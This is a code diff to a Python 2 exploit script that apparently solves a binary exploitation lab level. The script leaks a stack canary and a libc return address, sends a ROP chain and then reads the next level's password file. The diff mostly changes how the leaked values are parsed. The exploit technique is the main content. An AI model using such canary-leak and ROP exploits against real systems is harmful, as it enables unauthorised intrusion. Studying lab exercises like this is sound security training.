@@ -58,10 +58,9 @@ if __name__ == '__main__':
 
         print '\n[+] Stage 1: Steal stack canary and leak libc base'
         sendrecv(s, '2\n')
-        canary = int(sendrecv(s, '257\n').split()[-1])
+        canary = int(sendrecv(s, '257\n').split('\n')[0].split()[-1])
         sendrecv(s, '2\n')
-        sendrecv(s, '261\n').split()
-        retaddr = int(s.recv(2048).split('\n')[0].split()[-1])
+        retaddr = int(sendrecv(s, '261\n').split('\n')[0].split()[-1])
         # Convert the addresses
         canary = 0x100000000 + canary if canary < 0 else canary
         retaddr = 0x100000000 + retaddr if retaddr < 0 else retaddr
@@ -90,7 +89,7 @@ if __name__ == '__main__':
             sendrecv(s, '1\n')
             sendrecv(s, '%d\n' % x)
         print '[+] ROP chain ready! Time to invoke it'
-        sendrecv(s, '3\n')
+        sendrecv(s, '3\n', False)
 
         print '\n[+] Final stage: Read flag and go home'
         flag = sendrecv(s, 'cat /home/lab9A/.pass\n')
